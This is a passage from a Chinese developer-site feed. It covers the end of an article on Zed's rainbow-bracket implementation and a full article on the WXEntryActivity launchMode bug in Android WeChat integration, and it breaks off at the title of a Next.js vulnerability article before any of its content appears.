li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p><em>“以前看 Lisp 代码像解摩斯密码，现在？像在看霓虹灯管搭的乐高。”</em><br/>
—— 一位刚从 7 层嵌套回调中逃生的前端工程师</p>
</blockquote>
<hr/>
<h2 data-id="heading-0">🔍 一、什么是「彩虹括号」？—— 给括号穿上彩虹衣</h2>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1df3b09bc5a5458687601771be17d188~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgZ29sYW5n5a2m5Lmg6K6w:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765932175&amp;x-signature=HoHmZN8goXfQgizbbROyRxGkul0%3D" alt="彩虹括号效果示例：每层嵌套一个颜色，一眼定位匹配关系" loading="lazy"/></p>
<p>简单说：<strong>不同嵌套层级的括号，自动用不同颜色高亮</strong>。</p>
<p>比如这段 Rust：</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() {
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">x</span> = <span class="hljs-title function_ invoke__">foo</span>(<span class="hljs-title function_ invoke__">bar</span>(<span class="hljs-title function_ invoke__">baz</span>(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>), <span class="hljs-title function_ invoke__">qux</span>()), <span class="hljs-number">3</span>);
}
</code></pre>
<p>→ 最外层 <code>{ }</code> 是 <strong>蓝色</strong>，<br/>
→ <code>foo(…)</code> 是 <strong>橙色</strong>，<br/>
→ <code>bar(…)</code> 是 <strong>绿色</strong>，<br/>
→ <code>baz(…)</code> 是 <strong>紫色</strong>……<br/>
<strong>颜色轮换，层级分明</strong>，再也不用靠数括号或靠 IDE 高亮“临时成对”来猜匹配关系！</p>
<blockquote>
<p>💡 小知识：<br/>
此功能被 Zed 用户“蹲守”<strong>超过 3 年</strong> —— 是 Zed 史上请求量最高的功能 😎</p>
</blockquote>
<hr/>
<h2 data-id="heading-1">🛠️ 二、技术挑战：为什么“彩虹括号”没那么容易实现？</h2>
<p>乍一听：不就是给括号染个色？<br/>
但真正落地，要跨过三座大山：</p>





















<table><thead><tr><th>方案</th><th>问题</th></tr></thead><tbody><tr><td><strong>依赖语言服务器（LSP）</strong></td><td>LSP 协议压根没定义“括号配对/嵌套深度”这类信息；且 90% 的语言服务器不提供此能力 → ❌ 不可扩展</td></tr><tr><td><strong>照搬 VS Code 方案</strong></td><td>VS Code 为实现它，<strong>在内存中维护整棵语法树</strong> → 大文件卡顿、内存飙升 → ❌ 不适合 Zed 架构</td></tr><tr><td><strong>Zed 的选择</strong></td><td>✅ 只查询<strong>当前可见区域</strong>的括号；✅ 拆成小“块”（chunks）懒加载；✅ 复用现有 Tree-sitter 查询体系</td></tr></tbody></table>
<blockquote>
<p>📌 关键洞察：<br/>
用户不需要“绝对精确”的全局嵌套深度——<br/>
只要<strong>局部视觉区分清晰</strong>，哪怕深处分界处颜色错一位，<strong>人眼也几乎察觉不到</strong>。<br/>
<strong>“够用就好”的工程哲学，让性能与体验双赢。</strong></p>
</blockquote>
<hr/>
<h2 data-id="heading-2">🌲 三、核心技术：Tree-sitter + Chunked Query —— 小而美的组合拳</h2>
<p>Zed 早已用 <a href="https://link.juejin.cn?target=https%3A%2F%2Ftree-sitter.github.io%2F" target="_blank" title="https://tree-sitter.github.io/" ref="nofollow noopener noreferrer">Tree-sitter</a> 做语法高亮、大纲生成等。<br/>
而每个语言扩展，都自带一个 <code>brackets.scm</code> 查询文件，比如 Rust 的：</p>
<pre><code class="hljs language-scheme" lang="scheme">("(" @open ")" @close)
("[" @open "]" @close)
("{" @open "}" @close)
("&lt;" @open "&gt;" @close)
;; …省略 closure 和泛型
(("\"" @open "\"" @close) (#set! rainbow.exclude))  ; ← 这行关键！排除字符串引号
</code></pre>
<p>👉 这里 <code>(#set! rainbow.exclude)</code> 就是<strong>告诉彩虹括号：“引号别染色，免得干扰阅读”</strong>。</p>
<h3 data-id="heading-3">🧩 智能分块（Chunking）：性能的秘密武器</h3>
<p>Zed 不再“全文件扫描”，而是：</p>
<ol>
<li>
<p>把缓冲区（buffer）按 <strong>50 行一块</strong> 划分；</p>
</li>
<li>
<p>只对<strong>当前编辑器可见的块</strong>执行 Tree-sitter 括号查询；</p>
</li>
<li>
<p>每块独立计算嵌套深度 → <strong>颜色错位风险被限制在块边界</strong>（50 行 ≈ 屏幕 1~2 屏，几乎无感）；</p>
</li>
<li>
<p>编辑时只更新变动块，滚动时懒加载新块。</p>
</li>
</ol>
<blockquote>
<p>✅ 优点：</p>
<ul>
<li>内存占用低 —— 无需整棵语法树</li>
<li>启动快 —— 滚动到哪算到哪</li>
<li>远程开发友好 —— 和本地一致（靠 buffer 同步）</li>
</ul>
</blockquote>
<hr/>
<h2 data-id="heading-4">⚙️ 四、数据结构设计：极简但高效</h2>
<p>核心新增两个字段，放在 <code>Buffer</code>（Zed 的文档模型）里：</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">pub</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">TreeSitterData</span> {
    chunks: RowChunks,                 <span class="hljs-comment">// 行号分块管理器</span>
    brackets_by_chunks: <span class="hljs-type">Vec</span>&lt;<span class="hljs-type">Option</span>&lt;<span class="hljs-type">Vec</span>&lt;BracketMatch&lt;<span class="hljs-type">usize</span>&gt;&gt;&gt;&gt;,
}
<span class="hljs-keyword">pub</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">BracketMatch</span>&lt;T&gt; {
    <span class="hljs-keyword">pub</span> open_range: Range&lt;T&gt;,   <span class="hljs-comment">// 左括号位置</span>
    <span class="hljs-keyword">pub</span> close_range: Range&lt;T&gt;,  <span class="hljs-comment">// 右括号位置</span>
    <span class="hljs-keyword">pub</span> color_index: <span class="hljs-type">Option</span>&lt;<span class="hljs-type">usize</span>&gt;, <span class="hljs-comment">// 颜色序号：0=蓝, 1=橙, 2=绿...</span>
}
</code></pre>
<ul>
<li>✅ <strong>数据存在 Buffer，不在 Editor</strong> → 多窗口/分屏共享，不重复计算</li>
<li>✅ <strong>修改时立刻失效，渲染时才重查</strong> → 编辑流畅不卡顿</li>
<li>✅ <strong>复用主题配色</strong> → 7 种“强调色”循环，自动适配深色/浅色主题</li>
</ul>
<hr/>
<h2 data-id="heading-5">🧪 五、测试方法也硬核：可视化断言 + 深度嵌套验证</h2>
<p>Zed 团队用一种“可视化测试标记法”验证彩虹逻辑：</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>«<span class="hljs-number">1</span>()<span class="hljs-number">1</span>» «<span class="hljs-number">1</span>{
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">a</span> = one«<span class="hljs-number">2</span>(«<span class="hljs-number">3</span>()<span class="hljs-number">3</span>», «<span class="hljs-number">3</span>{ «<span class="hljs-number">4</span>()<span class="hljs-number">4</span>» }<span class="hljs-number">3</span>», «<span class="hljs-number">3</span>()<span class="hljs-number">3</span>»)<span class="hljs-number">2</span>»;
    <span class="hljs-keyword">for</span> <span class="hljs-variable">i</span> <span class="hljs-keyword">in</span> <span class="hljs-number">0</span>..a «<span class="hljs-number">2</span>{
        <span class="hljs-built_in">println!</span>«<span class="hljs-number">3</span>(<span class="hljs-string">"{i}"</span>)<span class="hljs-number">3</span>»;
    }<span class="hljs-number">2</span>»
}<span class="hljs-number">1</span>»
</code></pre>
<p>→ <code>«n…n»</code> 表示该对括号应被标为第 <code>n</code> 号颜色（1~7 循环）<br/>
→ 测试直接“看图说话”，精准验证嵌套逻辑是否正确！</p>
<hr/>
<h2 data-id="heading-6">🎛️ 六、如何开启？高度可定制！</h2>
<p>默认<strong>关闭</strong>（避免打扰旧用户），手动开启：</p>
<ol>
<li><code>Cmd + ,</code> 打开设置</li>
<li>搜索 <code>Colorize Brackets</code></li>
<li>可：
<ul>
<li>✅ 全局开启 / 按语言单独开（比如只给 Rust、JS 开）</li>
<li>✅ 排除特定括号（如 <code>"</code> <code>'</code>，默认已排除）</li>
<li>✅ 通过主题定制 7 种颜色</li>
</ul>
</li>
</ol>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a294a6dac7e54a2da606ff02390097ab~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgZ29sYW5n5a2m5Lmg6K6w:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765932175&amp;x-signature=KzECz8iTIqYLftn4XceeqwaeY6o%3D" alt="Zed 设置界面：Colorize Brackets 开关与语言粒度控制" loading="lazy"/></p>
<hr/>
<h2 data-id="heading-7">🔮 未来展望：不止于 <code>()[]{}</code></h2>
<p>Zed 已预留扩展能力：</p>
<ul>
<li>✅ <strong>HTML/JSX 标签配对</strong>（<code>&lt;div&gt;</code> / <code>&lt;/div&gt;</code>）技术上已支持，只需在 <code>brackets.scm</code> 中声明 → 下一版本或由社区贡献！</li>
<li>✅ <strong>更多 Tree-sitter 查询缓存化</strong>（如大纲、inlay hints）—— 借“分块缓存”框架复用</li>
</ul>
<hr/>
<h2 data-id="heading-8">✅ 总结：一次克制而优雅的工程实践</h2>

























<table><thead><tr><th>维度</th><th>Zed 方案亮点</th></tr></thead><tbody><tr><td><strong>性能</strong></td><td>分块懒加载 + Tree-sitter 局部查询 → 大文件不卡</td></tr><tr><td><strong>架构</strong></td><td>复用现有 <code>brackets.scm</code> + Buffer 缓存 → 低侵入</td></tr><tr><td><strong>体验</strong></td><td>颜色轮换 + 排除干扰项 + 主题融合 → 美观不刺眼</td></tr><tr><td><strong>扩展性</strong></td><td>分块框架可复用 → 为未来功能铺路</td></tr></tbody></table>
<blockquote>
<p>🎁 Zed 用 3 年时间，把一个“看似简单”的需求，打磨成<strong>兼顾性能、架构与用户体验的典范</strong>。<br/>
它再次证明：<strong>好工具，不在于堆功能，而在于用对的方法，解决真实的痛。</strong></p>
</blockquote>
<hr/></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[踩坑实录：微信小程序返回 App 失败？一次 `launchMode` 导致的 Activity 任务栈“迷航”]]></title>    <link>https://juejin.cn/post/7581678032337485866</link>    <guid>https://juejin.cn/post/7581678032337485866</guid>    <pubDate>2025-12-10T02:17:44.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581678032337485866" data-draft-id="7581752508780003371" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="踩坑实录：微信小程序返回 App 失败？一次 `launchMode` 导致的 Activity 任务栈“迷航”"/> <meta itemprop="keywords" content="Android"/> <meta itemprop="datePublished" content="2025-12-10T02:17:44.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="用户4165967369355"/> <meta itemprop="url" content="https://juejin.cn/user/1146150492576877"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            踩坑实录：微信小程序返回 App 失败？一次 `launchMode` 导致的 Activity 任务栈“迷航”
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1146150492576877/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    用户4165967369355
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-10T02:17:44.000Z" title="Wed Dec 10 2025 02:17:44 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-10
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body cache result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在 Android 应用开发中，集成微信登录、支付或小程序跳转等功能时，我们常常需要定义一个特定的回调 Activity，即 <code>WXEntryActivity</code>。最近，调试小程序遇到了一个让人困惑的问题：<strong>从微信小程序返回 App 时，App收到了相关信息，但无法正常展示离开的页面。</strong></p>
<p>经过一番排查和调整，终于找到了问题的根源，之前代码中误将 <code>WXEntryActivity</code> 的 <code>launchMode</code> 设置为了 <code>"singleInstance"</code> ，修改为 <code>"singleTask"</code> 后，恢复正常。</p>
<p>本文将分析这背后的原理，进一步理解 Android Activity 的 <strong>任务栈 (Task Stack)</strong> 机制，以及这两种 <code>launchMode</code> 在微信回调场景中的巨大差异。</p>
<hr/>
<h3 data-id="heading-0">一、问题现象与解决方案</h3>
<h4 data-id="heading-1">❌ 遇到的问题：</h4>
<p>当用户在 App 内启动微信小程序，完成操作后，点击左上角的“返回 App”按钮，或者微信回调启动 <code>WXEntryActivity</code> 处理结果后，App 无法正确返回到启动小程序的前一个页面，表现为界面停滞或回到了一个不正确的状态。</p>
<h4 data-id="heading-2">✅ 解决方案：</h4>
<p>将项目 <code>AndroidManifest.xml</code> 中 <code>WXEntryActivity</code> 的 <code>android:launchMode</code> 配置从 <code>"singleInstance"</code> 修改为 <code>"singleTask"</code>。</p>
<p>XML</p>
<pre><code class="hljs language-ini" lang="ini">&lt;activity
    android:<span class="hljs-attr">name</span>=<span class="hljs-string">"com.xxx.wxapi.WXEntryActivity"</span>
    android:<span class="hljs-attr">launchMode</span>=<span class="hljs-string">"singleTask"</span>
    android:<span class="hljs-attr">exported</span>=<span class="hljs-string">"true"</span>
    ...
/&gt;
</code></pre>
<hr/>
<h3 data-id="heading-3">二、<code>singleInstance</code> 为什么会导致“返回失败”？</h3>
<p>理解这个问题，关键在于理解 <code>singleInstance</code> 对 Activity 任务栈的极端要求。</p>
<h4 data-id="heading-4">1. <code>launchMode="singleInstance"</code> 的机制：</h4>
<p>当 Activity 被设置为 <code>singleInstance</code> 时，系统会强制执行以下两个规则：</p>
<ul>
<li><strong>独立任务栈：</strong> 无论何时启动这个 Activity，系统都会为它创建一个<strong>全新的、独立的任务栈 (Task Stack)</strong> 。</li>
<li><strong>栈中唯一：</strong> 这个任务栈中<strong>只允许存在这一个 Activity 实例</strong>。</li>
</ul>
<h4 data-id="heading-5">2. 微信回调中的“迷航”：</h4>
<ol>
<li><strong>启动：</strong> App 的某个页面 <code>A</code> 启动了微信小程序。</li>
<li><strong>回调：</strong> 微信小程序完成后，回调启动 <code>WXEntryActivity</code>。此时，<code>WXEntryActivity</code> 因为是 <code>singleInstance</code>，它被放置在了一个<strong>全新的、独立的任务栈 T2</strong> 中。</li>
<li><strong>App 状态：</strong> 您的 App 主任务栈 <strong>T1</strong>（包含 <code>A</code> Activity 等）仍然存在于后台。</li>
<li><strong>返回失败：</strong> <code>WXEntryActivity</code> (在 T2 中) 处理完数据后，通常会调用 <code>finish()</code> 结束自己。由于 T2 栈中只有它一个 Activity，T2 任务栈也会随之销毁。然而，系统在销毁 T2 之后，<strong>并没有正确地将 T1 任务栈中的顶部 Activity (即 A)</strong> 重新带到前台。这导致用户体感上就是“无法返回”。</li>
</ol>
<hr/>
<h3 data-id="heading-6">三、<code>singleTask</code> 如何完美解决问题？</h3>
<p><code>singleTask</code> 模式是专门为这种“中转站”和“入口”类 Activity 设计的最佳选择。</p>
<h4 data-id="heading-7">1. <code>launchMode="singleTask"</code> 的机制：</h4>
<ul>
<li>
<p><strong>寻找任务栈：</strong> Activity 启动时，系统会搜索系统中是否存在与该 Activity <strong><code>taskAffinity</code></strong> 匹配的任务栈。</p>
</li>
<li>
<p><strong>重复利用：</strong> 如果目标任务栈（即我们的 <strong>App 主任务栈 T1</strong>）存在：</p>
<ul>
<li><strong>Activity 会被放置在 T1 中。</strong></li>
<li>如果 T1 栈中已经存在该 Activity 实例，系统会清除位于该实例之上的所有 Activity，使它成为栈顶，并调用它的 <code>onNewIntent()</code> 方法。</li>
</ul>
</li>
<li>
<p><strong>栈中唯一：</strong> 在一个任务栈内，<code>WXEntryActivity</code> 始终<strong>只有一个实例</strong>。</p>
</li>
</ul>
<h4 data-id="heading-8">2. 正确的回调与返回流程：</h4>
<ol>
<li>
<p><strong>启动：</strong> App 的 Activity <code>A</code> 启动微信小程序。</p>
</li>
<li>
<p><strong>回调：</strong> 微信小程序回调启动 <code>WXEntryActivity</code>。由于是 <code>singleTask</code>，系统会把 <code>WXEntryActivity</code> <strong>直接放置在 App 的主任务栈 T1 的栈顶</strong>，位于 <code>A</code> 的上方。</p>
<ul>
<li><strong>任务栈 T1 状态：</strong> <code>... -&gt; Activity B -&gt; Activity A -&gt; WXEntryActivity (栈顶)</code></li>
</ul>
</li>
<li>
<p><strong>正常返回：</strong> <code>WXEntryActivity</code> (在 T1 中) 处理完数据后，调用 <code>finish()</code> 结束自己。</p>
</li>
<li>
<p><strong>完美衔接：</strong> <code>WXEntryActivity</code> 出栈后，<code>Activity A</code> 自然而然地成为 T1 的栈顶，系统会将其带到前台，<strong>完美地回到了启动小程序的前一个页面</strong>，符合用户预期。</p>
</li>
</ol>
<hr/>
<h3 data-id="heading-9">总结与最佳实践</h3>
<p>对于微信回调接口 <code>WXEntryActivity</code> 而言，它的核心职责是：<strong>接收回调结果，处理数据，然后迅速退出，将控制权交还给 App 的主业务页面。</strong></p>























<table><thead><tr><th><strong>launchMode</strong></th><th><strong>适用场景</strong></th><th><strong>微信回调场景</strong></th><th><strong>结果</strong></th></tr></thead><tbody><tr><td><strong><code>singleInstance</code></strong></td><td>需要完全独立、隔离的“单一窗口”应用，如闹钟、来电显示等。</td><td><strong>❌ 不适用</strong>，创建独立任务栈，返回时无法正确激活主 App 栈。</td><td><strong>返回失败/卡顿</strong></td></tr><tr><td><strong><code>singleTask</code></strong></td><td>业务流程中的“中转站”或“主入口”，确保其只有一个实例，且位于主任务栈。</td><td><strong>✅ 最佳实践</strong>，确保 Activity 位于主任务栈顶部，<code>finish()</code> 后完美返回。</td><td><strong>返回正常</strong></td></tr></tbody></table>
<p><strong>建议：</strong> 在集成任何需要回调的第三方 SDK (如微信、支付宝) 时，其回调 Activity 的 <code>launchMode</code> 几乎都应该选择 <strong><code>singleTask</code></strong>，以确保其正确集成到 App 的主任务流程中，避免出现任务栈混乱导致的导航问题。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Next.js 近期高危漏洞完整指南：原理 + 攻击示例（前端易懂版）]]></title>    <link>https://juejin.cn/post/7581702285564379186</link>    <guid>https://juejin.cn/post/7581702285564379186</guid>    <pubDate>2025-12-10T02:20:08.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581702285564379186" data-draft-id="7581702285564362802" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Next.js 近期高危漏洞完整指南：原理 + 攻击示例（前端易懂版）"/> <meta itemprop="keywords" content="前端,Next.js"/> <meta itemprop="datePublished" content="2025-12-10T02:20:08.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="鲫小鱼"/> <meta itemprop="url" content="https://juejin.cn/user/1046390798032110"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Next.js 近期高危漏洞完整指南：原理 + 攻击示例（前端易懂版）
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1046390798032110/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    鲫小鱼
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-10T02:20:08.000Z" title="Wed Dec 10 2025 02:20:08 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-10
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body cache result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid 